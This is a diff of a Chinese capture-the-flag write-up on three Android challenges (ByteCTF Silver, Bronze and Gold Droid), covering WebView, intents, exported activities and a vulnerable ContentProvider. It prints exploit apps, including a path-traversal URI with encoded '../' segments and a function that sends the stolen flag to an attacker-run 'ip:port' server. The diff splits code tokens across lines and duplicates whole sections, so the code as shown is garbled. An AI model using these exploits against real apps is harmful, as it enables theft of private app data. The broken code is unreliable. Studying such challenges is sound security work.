@@ -17,14 +17,21 @@
 
 Activity_main.xml文件
 
-<WebView android:id="@+id/eeeewebview" android:layout_width="0dp" android:layout_height="0dp" app:layout_constraintBottom_toBottomOf="parent" app:layout_constraintEnd_toEndOf="parent" app:layout_constraintStart_toStartOf="parent" app:layout_constraintTop_toTopOf="parent" />
+<WebView android:id="@+id/eeeewebview" android:
+layout_width="0dp" android:
+layout_height="0dp" app:
+layout_constraintBottom_toBottomOf="parent" app:
+layout_constraintEnd_toEndOf="parent" app:
+layout_constraintStart_toStartOf="parent" app:
+layout_constraintTop_toTopOf="parent" />
 
 MainActivity.java文件
 
 public void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main);
  // WebView WebView webView = (WebView) findViewById(R.id.eeeewebview); webView.loadUrl("https://www.baidu.com"); webView.setWebViewClient(new WebViewClient(){ @Override public boolean shouldOverrideUrlLoading(WebView view, String url) { //使用WebView加载显示url view.loadUrl(url); //返回true return true; } });
 
-写完之后运行，发现报错，无法打开网页(net::ERR_CLEARTEXT_NOT_PERMITTED)， 经过搜索在manifest内设置usesCleartextTraffic为true即可。
+写完之后运行，发现报错，无法打开网页(net::
+ERR_CLEARTEXT_NOT_PERMITTED)， 经过搜索在manifest内设置usesCleartextTraffic为true即可。
 
 可以看到百度已经被打开了，啊～因为这个app是我用来测试其他东西的，所以会看到三个奇奇怪怪的按钮。
 
@@ -72,7 +79,8 @@ intent包括两种，一是显式另一个是隐式。显式intent通常是已�
 
 Intent intent = new Intent(Intent.ACTION_MAIN);intent.addCategory(Intent.CATEGORY_LAUNCHER); ComponentName cn = new ComponentName(packageName, className); intent.setComponent(cn);startActivity(intent);
 
-一个activity是否能被其他app的组件启动取决于”android:exported”，true能，false不能。如果是false，这个activity只能被相同app的组件启动，或者是相同user ID的app的组件启动。
+一个activity是否能被其他app的组件启动取决于”android:
+exported”，true能，false不能。如果是false，这个activity只能被相同app的组件启动，或者是相同user ID的app的组件启动。
 
 如果显式设置exported属性，不管这个activity有没有设置intent-filter,那么exported的值就是显式设置的值。
 
@@ -116,9 +124,10 @@ am start -a android.intent.action.VIEW -d https://www.baidu.com
 
 同时记得自己写的apk要在AndroidManifest.xml内加两句话，可以让其有网络访问的权限。
 
-<uses-permission android:name="android.permission.INTERNET"/>
 
-<application android:usesCleartextTraffic="true"
+
+<application android:
+usesCleartextTraffic="true"
 
 三
 
@@ -126,16 +135,19 @@ Silver Droid
 
 主要由攻击者提供一个url，在url内布置好exp，从而进行达到利用的目的，具体见代码块内分析。
 
-#!/usr/bin/env python3import os import randomimport subprocessimport sysimport timeimport requestsimport uuidfrom hashlib import *import zipfileimport signalimport string
+#!/usr/bin/env python3import os import randomimport subprocessimport sysimport timeimport requestsimport uuid
+from hashlib import *import zipfileimport signalimport string
 isMacos = len(sys.argv) == 2wordlist = string.ascii_lettersdifficulty = 4random_hex = lambda x: ''.join([random.choice(wordlist) for _ in range(x)])ADB_PORT = int(random.random() * 60000 + 5000)EMULATOR_PORT = 36666 if isMacos else (ADB_PORT + 1)EXPLOIT_TIME_SECS = 30APK_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "app-debug.apk")FLAG_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "flag")HOME = "/home/user"VULER = "com.bytectf.silverdroid"
 
 ENV = {}ENV.update(os.environ)if not isMacos: ENV.update({ "ANDROID_ADB_SERVER_PORT": "{}".format(ADB_PORT), "ANDROID_SERIAL": "emulator-{}".format(EMULATOR_PORT), "ANDROID_SDK_ROOT": "/opt/android/sdk", "ANDROID_SDK_HOME": HOME, "ANDROID_PREFS_ROOT": HOME, "ANDROID_EMULATOR_HOME": HOME + "/.android", "ANDROID_AVD_HOME": HOME + "/.android/avd", "JAVA_HOME": "/usr/lib/jvm/java-11-openjdk-amd64", "PATH": "/opt/android/sdk/cmdline-tools/latest/bin:/opt/android/sdk/emulator:/opt/android/sdk/platform-tools:/bin:/usr/bin:" + os.environ.get("PATH", "") })
 
 def print_to_user(message): print(message) sys.stdout.flush()
-def download_file(url): try: download_dir = "download" if not os.path.isdir(download_dir): os.mkdir(download_dir) tmp_file = os.path.join(download_dir, time.strftime("%m-%d-%H:%M:%S", time.localtime())+str(uuid.uuid4())+'.apk') f = requests.get(url) if len(f.content) > 10*1024*1024: # Limit size 10M return None with open(tmp_file, 'wb') as fp: fp.write(f.content) return tmp_file except: return None
+def download_file(url): try: download_dir = "download" if not os.path.isdir(download_dir): os.mkdir(download_dir) tmp_file = os.path.join(download_dir, time.strftime("%m-%d-%H:%M:%S", time.localtime())+str(uuid.uuid4())+'.apk') f = requests.get(url) if len(f.content) > 10*1024*1024: # Limit size 10M return None with open(tmp_file, 'wb') as fp: fp.write(f.content) return tmp_file 
+except: return None
 def proof_of_work(): print_to_user(f"First, to ensure that the service will not be dos, please answer me a question.") prefix = random_hex(6) suffix = random_hex(difficulty) targetHash = sha256((prefix+suffix).encode()).hexdigest() print_to_user(f'Question: sha256(("{prefix}"+"{"x"*difficulty}").encode()).hexdigest() == "{targetHash}"') print_to_user(f'Please enter the {"x"*difficulty} to satisfy the above equation:') proof = sys.stdin.readline().strip() return sha256((prefix+proof).encode()).hexdigest() == targetHash
 
-def check_apk(path): # return True try: z = zipfile.ZipFile(path) for f in z.filelist: if f.filename == "AndroidManifest.xml": return True return False except: return False
+def check_apk(path): # return True try: z = zipfile.ZipFile(path) for f in z.filelist: if f.filename == "AndroidManifest.xml": return True return False 
+except: return False
 def setup_emulator():
  #avdmanager是一个命令行工具，可以用于从命令行创建和管理 Android 虚拟设备 (AVD)，借助 AVD，您可以定义要在 Android 模拟器中模拟的 Android 手机 subprocess.call( "avdmanager" + " create avd" + " --name 'pixel_xl_api_30'" + " --abi 'google_apis/x86_64'" + " --package 'system-images;android-30;google_apis;x86_64'" + " --device pixel_xl" + " --force" + ("" if isMacos else " > /dev/null 2> /dev/null"), env=ENV, close_fds=True, shell=True)
  return subprocess.Popen( "emulator" + " -avd pixel_xl_api_30" + " -no-cache" + " -no-snapstorage" + " -no-snapshot-save" + " -no-snapshot-load" + " -no-audio" + " -no-window" + " -no-snapshot" + " -no-boot-anim" + " -wipe-data" + " -accel on" + " -netdelay none" + " -no-sim" + " -netspeed full" + " -delay-adb" + " -port {}".format(EMULATOR_PORT) + ("" if isMacos else " > /dev/null 2> /dev/null ") + "", env=ENV, close_fds=True, shell=True, #通过操作系统的 shell 执行指定的命令 preexec_fn=os.setsid)
@@ -146,22 +158,40 @@ def adb_broadcast(action, receiver, extras=None): args = ["shell", "su", "root",
 
 print_to_user(r"""[0;1;35;95m░█[0;1;31;91m▀▀[0;1;33;93m░█[0;1;32;92m░░[0;1;36;96m░▀[0;1;34;94m█▀[0;1;35;95m░█[0;1;31;91m░█[0;1;33;93m░█[0;1;32;92m▀▀[0;1;36;96m░█[0;1;34;94m▀▄[0;1;35;95m░█[0;1;31;91m▀▄[0;1;33;93m░█[0;1;32;92m▀▄[0;1;36;96m░█[0;1;34;94m▀█[0;1;35;95m░▀[0;1;31;91m█▀[0;1;33;93m░█[0;1;32;92m▀▄[0m[0;1;31;91m░▀[0;1;33;93m▀█[0;1;32;92m░█[0;1;36;96m░░[0;1;34;94m░░[0;1;35;95m█░[0;1;31;91m░▀[0;1;33;93m▄▀[0;1;32;92m░█[0;1;36;96m▀▀[0;1;34;94m░█[0;1;35;95m▀▄[0;1;31;91m░█[0;1;33;93m░█[0;1;32;92m░█[0;1;36;96m▀▄[0;1;34;94m░█[0;1;35;95m░█[0;1;31;91m░░[0;1;33;93m█░[0;1;32;92m░█[0;1;36;96m░█[0m[0;1;33;93m░▀[0;1;32;92m▀▀[0;1;36;96m░▀[0;1;34;94m▀▀[0;1;35;95m░▀[0;1;31;91m▀▀[0;1;33;93m░░[0;1;32;92m▀░[0;1;36;96m░▀[0;1;34;94m▀▀[0;1;35;95m░▀[0;1;31;91m░▀[0;1;33;93m░▀[0;1;32;92m▀░[0;1;36;96m░▀[0;1;34;94m░▀[0;1;35;95m░▀[0;1;31;91m▀▀[0;1;33;93m░▀[0;1;32;92m▀▀[0;1;36;96m░▀[0;1;34;94m▀░[0m""")
 if not isMacos: if not proof_of_work(): print_to_user("Please proof of work again, exit...n") exit(-1)
-print_to_user("Please enter your poc url:")url = sys.stdin.readline().strip()# url should be like "https://xxx" to to ensure that `adb shell` passes intent.data correctly.if url.strip('"') == url: url = f'"{url}"'if not url.startswith('"https://'): print_to_user("Invalid poc url.n") exit(-1)
+print_to_user("Please enter your poc url:")url = sys.stdin.readline().strip()
+# url should be like "https://xxx" to to ensure that `adb shell` passes intent.data correctly.if url.strip('"') == url: url = f'"{url}"'if not url.startswith('"https://'): print_to_user("Invalid poc url.n") exit(-1)
 print_to_user("Preparing android emulator. This may takes about 2 minutes...n")emulator = setup_emulator()#只有连接上了模拟器/设备连接上了adb，服务才会被执行，而在Android系统完全启动前执行就会有错误发生adb(["wait-for-device"])
-adb_install(APK_FILE) #将apk文件装到模拟器中with open(FLAG_FILE, "r") as f: adb_broadcast(f"com.wuhengctf.SET_FLAG", f"{VULER}/.FlagReceiver", extras={"flag": f.read()})#adb shell su root am broadcast -W -a "com.wuhengctf.SET_FLAG" -n "com.bytectf.silverdroid/.FlagReceiver" -e 'flag' 'flag{eeeeeeee}'#am broadcast 发送广播#-a com.wuhengctf.SET_FLAG:指定intent操作，如android.intent.action.VIEW,Intent intent = new Intent(); intent.setAction("android.SET_FLAG");#-n "com.bytectf.silverdroid/.FlagReceiver": 确定接收者#-e 'flag' 'flag{eeeeeeee}': 字符串
+adb_install(APK_FILE) #将apk文件装到模拟器中with open(FLAG_FILE, "r") as f: adb_broadcast(f"com.wuhengctf.SET_FLAG", f"{VULER}/.FlagReceiver", extras={"flag": f.read()})#adb shell su root am broadcast -W -a "com.wuhengctf.SET_FLAG" -n "com.bytectf.silverdroid/.FlagReceiver" -e 'flag' 'flag{eeeeeeee}'#am broadcast 发送广播#-a com.wuhengctf.SET_FLAG:
+指定intent操作，如android.intent.action.VIEW,Intent intent = new Intent(); intent.setAction("android.SET_FLAG");#-n "com.bytectf.silverdroid/.FlagReceiver": 确定接收者#-e 'flag' 'flag{eeeeeeee}': 字符串
 
-adb_activity(f"{VULER}/.MainActivity", wait=True, data=url)# adb shell am start -W -n "com.bytectf.silverdroid/.MainActivity" -d "url"#-n "com.bytectf.silverdroid/.MainActivity":启动MainActivity#-d "url":传递url给MainActivity，而silver droid程序通过Uri uri0 = this.getIntent().getData()接收url
+adb_activity(f"{VULER}/.MainActivity", wait=True, data=url)
+# adb shell am start -W -n "com.bytectf.silverdroid/.MainActivity" -d "url"#-n "com.bytectf.silverdroid/.MainActivity":
+启动MainActivity#-d "url":
+传递url给MainActivity，而silver droid程序通过Uri uri0 = this.getIntent().getData()接收url
 
 print_to_user("Launching! Let your apk fly for a while...n")
 if isMacos: input('wait for debug')else: time.sleep(EXPLOIT_TIME_SECS)
 print_to_user("exiting......")
-try: os.killpg(os.getpgid(emulator.pid), signal.SIGTERM) os.killpg(os.getpgid(os.getpid()), signal.SIGTERM)except: pass
+try: os.killpg(os.getpgid(emulator.pid), signal.SIGTERM) os.killpg(os.getpgid(os.getpid()), signal.SIGTERM)
+except: pass
 
 使用jeb打开apk，MainActivity如下：
 
 package com.bytectf.silverdroid;
-import android.net.Uri;import android.os.Bundle;import android.util.Log;import android.webkit.WebResourceRequest;import android.webkit.WebResourceResponse;import android.webkit.WebView;import android.webkit.WebViewClient;import androidx.appcompat.app.AppCompatActivity;import java.io.File;import java.io.FileInputStream;import java.io.IOException;import java.util.HashMap;
-public class MainActivity extends AppCompatActivity { @Override // androidx.fragment.app.FragmentActivity protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); this.setContentView(0x7F0B001C); // layout:activity_main Uri uri0 = this.getIntent().getData(); //获得intent所传过来的data参数，可以来自另一个app if(uri0 != null) { //若参数不为null WebView webView = new WebView(this.getApplicationContext());//新建的页面取得是整个app的context webView.setWebViewClient(new WebViewClient() { //当从一个网页跳转到另外一个网页时，我们希望目标网页仍然在当前的webview中显示，而不是在浏览器中打开 @Override // android.webkit.WebViewClient public boolean shouldOverrideUrlLoading(WebView view, String url) { //当shouldOverrideUrlLoading返回值为true，拦截webview加载url try { Uri uri0 = Uri.parse(url); //解析url Log.e("Hint", "Try to upload your poc on free COS: https://cloud.tencent.com/document/product/436/6240"); if(uri0.getScheme().equals("https")) { //scheme必须是https return !uri0.getHost().endsWith(".myqcloud.com");//若是以.myqcloud.com结尾，返回true，再取反返回false，不会拦截webview加载url } } catch(Exception e) { e.printStackTrace(); return true; }
+import android.net.Uri;
+import android.os.Bundle;
+import android.util.Log;
+import android.webkit.WebResourceRequest;
+import android.webkit.WebResourceResponse;
+import android.webkit.WebView;
+import android.webkit.WebViewClient;
+import androidx.appcompat.app.AppCompatActivity;
+import java.io.File;
+import java.io.FileInputStream;
+import java.io.IOException;
+import java.util.HashMap;
+public class MainActivity extends AppCompatActivity { @Override // androidx.fragment.app.FragmentActivity protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); this.setContentView(0x7F0B001C); // layout:
+activity_main Uri uri0 = this.getIntent().getData(); //获得intent所传过来的data参数，可以来自另一个app if(uri0 != null) { //若参数不为null WebView webView = new WebView(this.getApplicationContext());//新建的页面取得是整个app的context webView.setWebViewClient(new WebViewClient() { //当从一个网页跳转到另外一个网页时，我们希望目标网页仍然在当前的webview中显示，而不是在浏览器中打开 @Override // android.webkit.WebViewClient public boolean shouldOverrideUrlLoading(WebView view, String url) { //当shouldOverrideUrlLoading返回值为true，拦截webview加载url try { Uri uri0 = Uri.parse(url); //解析url Log.e("Hint", "Try to upload your poc on free COS: https://cloud.tencent.com/document/product/436/6240"); if(uri0.getScheme().equals("https")) { //scheme必须是https return !uri0.getHost().endsWith(".myqcloud.com");//若是以.myqcloud.com结尾，返回true，再取反返回false，不会拦截webview加载url } } catch(Exception e) { e.printStackTrace(); return true; }
  return true; } }); webView.setWebViewClient(new WebViewClient() { @Override // android.webkit.WebViewClient public WebResourceResponse shouldInterceptRequest(WebView view, WebResourceRequest request) { //拦截url，js，css等响应阶段,拦截所有的url请求，若返回非空，则不再进行网络资源请求，而是使用返回的资源数据 FileInputStream inputStream; Uri uri0 = request.getUrl(); //获得js请求的request if(uri0.getPath().startsWith("/local_cache/")) { //检查域名后的path是否为/local_cache/开头 File cacheFile = new File(MainActivity.this.getCacheDir(), uri0.getLastPathSegment()); //只是在内存中创建File文件映射对象,而并不会在硬盘中创建文件，新建file以cache为目录，uri0的最后一个地址段 //getCacheDir获取手机中/data/data/包名/cache目录；
  if(cacheFile.exists()) { //若映射的文件真实存在，则进入下面循环 try { inputStream = new FileInputStream(cacheFile);//其将文件内容读取到了内存inputStream内，之后可以进行读取操作 } catch(IOException e) { return null; }
  HashMap headers = new HashMap(); headers.put("Access-Control-Allow-Origin", "*"); return new WebResourceResponse("text/html", "utf-8", 200, "OK", headers, inputStream); //返回响应 } }
@@ -200,8 +230,10 @@ print_to_user("Launching! Let your apk fly for a while...n")
 看代码如下，一眼看去好短。
 
 package com.bytectf.bronzedroid;
-import android.app.Activity;import android.os.Bundle;
-public class MainActivity extends Activity { @Override // android.app.Activity protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); this.setContentView(0x7F0B001C); // layout:activity_main String s = this.getIntent().getAction(); //获得启动该Activity的intent的Action属性 if(s != null && (s.equals("ACTION_SHARET_TO_ME"))) { //判断 this.setResult(-1, this.getIntent()); //将某些数据回带给启动该Activity的Activity this.finish(); } }}
+import android.app.Activity;
+import android.os.Bundle;
+public class MainActivity extends Activity { @Override // android.app.Activity protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); this.setContentView(0x7F0B001C); // layout:
+activity_main String s = this.getIntent().getAction(); //获得启动该Activity的intent的Action属性 if(s != null && (s.equals("ACTION_SHARET_TO_ME"))) { //判断 this.setResult(-1, this.getIntent()); //将某些数据回带给启动该Activity的Activity this.finish(); } }}
 
 MainActivity的exported属性为true，所以可以通过外部app来启动MainActivity，具体利用思路可以是编写的恶意apk自带uri来访问受害者apk的flag文件，然后受害者app通过setResult将flag回带给恶意apk。
 
@@ -211,8 +243,18 @@ MainActivity的exported属性为true，所以可以通过外部app来启动MainA
 
 package com.eeeetest.bronzedroid_pwn;
 import androidx.appcompat.app.AppCompatActivity;
-import android.content.Intent;import android.net.Uri;import android.os.Bundle;import android.util.Log;import android.widget.TextView;
-import java.io.BufferedReader;import java.io.IOException;import java.io.InputStreamReader;import java.io.OutputStream;import java.net.HttpURLConnection;import java.net.Socket;import java.net.URL;
+import android.content.Intent;
+import android.net.Uri;
+import android.os.Bundle;
+import android.util.Log;
+import android.widget.TextView;
+import java.io.BufferedReader;
+import java.io.IOException;
+import java.io.InputStreamReader;
+import java.io.OutputStream;
+import java.net.HttpURLConnection;
+import java.net.Socket;
+import java.net.URL;
 public class MainActivity extends AppCompatActivity {
  @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main);
 
@@ -242,8 +284,14 @@ print_to_user("exiting......")
 代码看起来没有什么漏洞，只是创建了一个文件并向内部写入” I’m in external”。
 
 package com.bytectf.golddroid;
-import android.os.Bundle;import androidx.appcompat.app.AppCompatActivity;import java.io.File;import java.io.FileOutputStream;import java.io.IOException;import java.nio.charset.StandardCharsets;
-public class MainActivity extends AppCompatActivity { @Override // androidx.fragment.app.FragmentActivity protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); this.setContentView(0x7F0B001C); // layout:activity_main File externalFile = new File(this.getExternalFilesDir("sandbox"), "file1"); //getExternalFilesDir对应的目录是/sdcard/Android/data/包名/files/，映射sandbox文件夹内的file1文件 try { FileOutputStream fileOutputStream = new FileOutputStream(externalFile); //创建externalFile文件 fileOutputStream.write("I'm in externaln".getBytes(StandardCharsets.UTF_8)); //写入 fileOutputStream.close(); } catch(IOException e) { e.printStackTrace(); } }}
+import android.os.Bundle;
+import androidx.appcompat.app.AppCompatActivity;
+import java.io.File;
+import java.io.FileOutputStream;
+import java.io.IOException;
+import java.nio.charset.StandardCharsets;
+public class MainActivity extends AppCompatActivity { @Override // androidx.fragment.app.FragmentActivity protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); this.setContentView(0x7F0B001C); // layout:
+activity_main File externalFile = new File(this.getExternalFilesDir("sandbox"), "file1"); //getExternalFilesDir对应的目录是/sdcard/Android/data/包名/files/，映射sandbox文件夹内的file1文件 try { FileOutputStream fileOutputStream = new FileOutputStream(externalFile); //创建externalFile文件 fileOutputStream.write("I'm in externaln".getBytes(StandardCharsets.UTF_8)); //写入 fileOutputStream.close(); } catch(IOException e) { e.printStackTrace(); } }}
 
 VulProvider好像存在漏洞的样子。
 
@@ -252,7 +300,14 @@ VulProvider使用了ContentProvider将应用程序的数据暴露给外界。
 如何通过一套标准及统一的接口获取其他应用程序暴露的数据？Android提供了ContentResolver，外界的程序可以通过ContentResolver接口访问ContentProvider提供的数据。ContentResolver是通过URI来获取Provider所提供的数据。
 
 package com.bytectf.golddroid;
-import android.content.ContentProvider;import android.content.ContentValues;import android.database.Cursor;import android.net.Uri;import android.os.ParcelFileDescriptor;import java.io.File;import java.io.FileNotFoundException;import java.io.IOException;
+import android.content.ContentProvider;
+import android.content.ContentValues;
+import android.database.Cursor;
+import android.net.Uri;
+import android.os.ParcelFileDescriptor;
+import java.io.File;
+import java.io.FileNotFoundException;
+import java.io.IOException;
 public class VulProvider extends ContentProvider { // @Override // android.content.ContentProvider public int delete(Uri uri, String selection, String[] selectionArgs) { return 0; }
  @Override // android.content.ContentProvider public String getType(Uri uri) { return null; }
  @Override // android.content.ContentProvider public Uri insert(Uri uri, ContentValues values) { return null; }
@@ -279,9 +334,12 @@ private static FileDescriptor openInternal(File file, int mode) throws FileNotFo
 我写了一个demo，大家可以试试看，挺好玩的。
 
 package com.bytectf.test;
-import androidx.appcompat.app.AppCompatActivity;import java.io.File;import java.io.IOException;
+import androidx.appcompat.app.AppCompatActivity;
+import java.io.File;
+import java.io.IOException;
 
-import android.net.Uri;import android.os.Bundle;
+import android.net.Uri;
+import android.os.Bundle;
 public class MainActivity extends AppCompatActivity {
  @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); File file0 = new File("/data/data/com.bytectf.pwngolddroid/","cache"); //取得相对路径 System.out.println("file0 Path: " + file0.getPath());
  String path = "content://slipme/" + "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fdata%2Fdata%2Fcom.bytectf.pwngolddroid%2Fsymlink"; Uri uri = Uri.parse(path); System.out.println("uri.getLastPathSegment:"+uri.getLastPathSegment()); //利用"%2F"绕过getLastPathSegment，让其存在目录穿越
@@ -301,11 +359,20 @@ public class MainActivity extends AppCompatActivity {
 MainActivity如下：
 
 package com.bytectf.pwngolddroid;
-import androidx.appcompat.app.AppCompatActivity;import android.content.ContentResolver;import android.net.Uri;import android.os.Bundle;import android.util.Log;
-import java.io.BufferedReader;import java.io.IOException;import java.io.InputStream;import java.net.HttpURLConnection;import java.net.URL;
+import androidx.appcompat.app.AppCompatActivity;
+import android.content.ContentResolver;
+import android.net.Uri;
+import android.os.Bundle;
+import android.util.Log;
+import java.io.BufferedReader;
+import java.io.IOException;
+import java.io.InputStream;
+import java.net.HttpURLConnection;
+import java.net.URL;
 
 public class MainActivity extends AppCompatActivity { String symlink;
- public void httpGet(String msg) { new Thread(new Runnable() { @Override public void run() { HttpURLConnection connection = null; BufferedReader reader = null; try { Log.e("in_httpGet","inHttpGet1"); URL url = new URL("http://ip:port/flag?flag=" + msg); //这里可以写自己博客的ip和端口，对其进行访问，然后查看日志，我的日志在/var/log/nginx/access.log Thread.sleep(1); Log.e("in_httpGet","inHttpGet2"); connection = (HttpURLConnection) url.openConnection(); Thread.sleep(1); Log.e("in_httpGet","inHttpGet3"); connection.setRequestMethod("GET"); Thread.sleep(1); Log.e("in_httpGet","inHttpGet4"); connection.getInputStream(); Thread.sleep(1); Log.e("httpget succeed","http_get succeed"); } catch (IOException | InterruptedException e) { e.printStackTrace(); } } }).start(); }
+ public void httpGet(String msg) { new Thread(new Runnable() { @Override public void run() { HttpURLConnection connection = null; BufferedReader reader = null; try { Log.e("in_httpGet","inHttpGet1"); URL url = new URL("http://ip:
+port/flag?flag=" + msg); //这里可以写自己博客的ip和端口，对其进行访问，然后查看日志，我的日志在/var/log/nginx/access.log Thread.sleep(1); Log.e("in_httpGet","inHttpGet2"); connection = (HttpURLConnection) url.openConnection(); Thread.sleep(1); Log.e("in_httpGet","inHttpGet3"); connection.setRequestMethod("GET"); Thread.sleep(1); Log.e("in_httpGet","inHttpGet4"); connection.getInputStream(); Thread.sleep(1); Log.e("httpget succeed","http_get succeed"); } catch (IOException | InterruptedException e) { e.printStackTrace(); } } }).start(); }
  private String readUri(Uri uri) { InputStream inputStream = null; try { ContentResolver contentResolver = getContentResolver(); inputStream = contentResolver.openInputStream(uri); if (inputStream != null) { byte[] buffer = new byte[1024]; int result; String content = ""; while ((result = inputStream.read(buffer)) != -1) { content = content.concat(new String(buffer, 0, result)); } return content; } } catch (IOException e) { Log.e("receiver", "IOException when reading uri", e); } catch (IllegalArgumentException e) { Log.e("receiver", "IllegalArgumentException", e); } finally { if (inputStream != null) { try { inputStream.close(); } catch (IOException e) { Log.e("receiver", "IOException when closing stream", e); } } } return null; } @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main);
  String root = getApplicationInfo().dataDir; symlink = root + "/symlink"; try {
  Runtime.getRuntime().exec("chmod -R 777 " + root).waitFor(); } catch (InterruptedException e) { e.printStackTrace(); } catch (IOException e) { e.printStackTrace(); }
@@ -352,92 +419,42 @@ https://bbs.pediy.com/user-home-922338.htm
 ```
 一
 前置知识
-```
-
-
-
-```
 1.显示和渲染web界面2.直接使用html进行布局3.与js进行交互
-```
-
-
-
-```
-<WebView android:id="@+id/eeeewebview" android:layout_width="0dp" android:layout_height="0dp" app:layout_constraintBottom_toBottomOf="parent" app:layout_constraintEnd_toEndOf="parent" app:layout_constraintStart_toStartOf="parent" app:layout_constraintTop_toTopOf="parent" />
-```
-
-
-
-```
+<WebView android:id="@+id/eeeewebview" android:
+layout_width="0dp" android:
+layout_height="0dp" app:
+layout_constraintBottom_toBottomOf="parent" app:
+layout_constraintEnd_toEndOf="parent" app:
+layout_constraintStart_toStartOf="parent" app:
+layout_constraintTop_toTopOf="parent" />
 public void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main);
  // WebView WebView webView = (WebView) findViewById(R.id.eeeewebview); webView.loadUrl("https://www.baidu.com"); webView.setWebViewClient(new WebViewClient(){ @Override public boolean shouldOverrideUrlLoading(WebView view, String url) { //使用WebView加载显示url view.loadUrl(url); //返回true return true; } });
-```
-
-
-
-```
 大致为[scheme:]scheme-specific-part[#fragment]细分为[scheme:][//authority][path][?query][#fragment]
-```
-
-
-
-```
 http://www.eeeeeeeeeeeeeeeea.cn/about?id=1
-```
-
-
-
-```
 Intent intent = new Intent(Intent.ACTION_MAIN);intent.addCategory(Intent.CATEGORY_LAUNCHER); ComponentName cn = new ComponentName(packageName, className); intent.setComponent(cn);startActivity(intent);
-```
-
-
-
-```
 二
 题目环境布置
-```
-
-
-
-```
 am broadcast -W -a "com.wuhengctf.SET_FLAG" -n "com.bytectf.silverdroid/.FlagReceiver" -e 'flag' 'flag{eeeeeeee}'
-```
-
-
-
-```
 am start -a android.intent.action.VIEW -d https://www.baidu.com
-```
 
 
-
-```
-<uses-permission android:name="android.permission.INTERNET"/>
-
-<application android:usesCleartextTraffic="true"
-```
-
-
-
-```
+<application android:
+usesCleartextTraffic="true"
 三
 Silver Droid
-```
-
-
-
-```
-#!/usr/bin/env python3import os import randomimport subprocessimport sysimport timeimport requestsimport uuidfrom hashlib import *import zipfileimport signalimport string
+#!/usr/bin/env python3import os import randomimport subprocessimport sysimport timeimport requestsimport uuid
+from hashlib import *import zipfileimport signalimport string
 isMacos = len(sys.argv) == 2wordlist = string.ascii_lettersdifficulty = 4random_hex = lambda x: ''.join([random.choice(wordlist) for _ in range(x)])ADB_PORT = int(random.random() * 60000 + 5000)EMULATOR_PORT = 36666 if isMacos else (ADB_PORT + 1)EXPLOIT_TIME_SECS = 30APK_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "app-debug.apk")FLAG_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "flag")HOME = "/home/user"VULER = "com.bytectf.silverdroid"
 
 ENV = {}ENV.update(os.environ)if not isMacos: ENV.update({ "ANDROID_ADB_SERVER_PORT": "{}".format(ADB_PORT), "ANDROID_SERIAL": "emulator-{}".format(EMULATOR_PORT), "ANDROID_SDK_ROOT": "/opt/android/sdk", "ANDROID_SDK_HOME": HOME, "ANDROID_PREFS_ROOT": HOME, "ANDROID_EMULATOR_HOME": HOME + "/.android", "ANDROID_AVD_HOME": HOME + "/.android/avd", "JAVA_HOME": "/usr/lib/jvm/java-11-openjdk-amd64", "PATH": "/opt/android/sdk/cmdline-tools/latest/bin:/opt/android/sdk/emulator:/opt/android/sdk/platform-tools:/bin:/usr/bin:" + os.environ.get("PATH", "") })
 
 def print_to_user(message): print(message) sys.stdout.flush()
-def download_file(url): try: download_dir = "download" if not os.path.isdir(download_dir): os.mkdir(download_dir) tmp_file = os.path.join(download_dir, time.strftime("%m-%d-%H:%M:%S", time.localtime())+str(uuid.uuid4())+'.apk') f = requests.get(url) if len(f.content) > 10*1024*1024: # Limit size 10M return None with open(tmp_file, 'wb') as fp: fp.write(f.content) return tmp_file except: return None
+def download_file(url): try: download_dir = "download" if not os.path.isdir(download_dir): os.mkdir(download_dir) tmp_file = os.path.join(download_dir, time.strftime("%m-%d-%H:%M:%S", time.localtime())+str(uuid.uuid4())+'.apk') f = requests.get(url) if len(f.content) > 10*1024*1024: # Limit size 10M return None with open(tmp_file, 'wb') as fp: fp.write(f.content) return tmp_file 
+except: return None
 def proof_of_work(): print_to_user(f"First, to ensure that the service will not be dos, please answer me a question.") prefix = random_hex(6) suffix = random_hex(difficulty) targetHash = sha256((prefix+suffix).encode()).hexdigest() print_to_user(f'Question: sha256(("{prefix}"+"{"x"*difficulty}").encode()).hexdigest() == "{targetHash}"') print_to_user(f'Please enter the {"x"*difficulty} to satisfy the above equation:') proof = sys.stdin.readline().strip() return sha256((prefix+proof).encode()).hexdigest() == targetHash
 
-def check_apk(path): # return True try: z = zipfile.ZipFile(path) for f in z.filelist: if f.filename == "AndroidManifest.xml": return True return False except: return False
+def check_apk(path): # return True try: z = zipfile.ZipFile(path) for f in z.filelist: if f.filename == "AndroidManifest.xml": return True return False 
+except: return False
 def setup_emulator():
  #avdmanager是一个命令行工具，可以用于从命令行创建和管理 Android 虚拟设备 (AVD)，借助 AVD，您可以定义要在 Android 模拟器中模拟的 Android 手机 subprocess.call( "avdmanager" + " create avd" + " --name 'pixel_xl_api_30'" + " --abi 'google_apis/x86_64'" + " --package 'system-images;android-30;google_apis;x86_64'" + " --device pixel_xl" + " --force" + ("" if isMacos else " > /dev/null 2> /dev/null"), env=ENV, close_fds=True, shell=True)
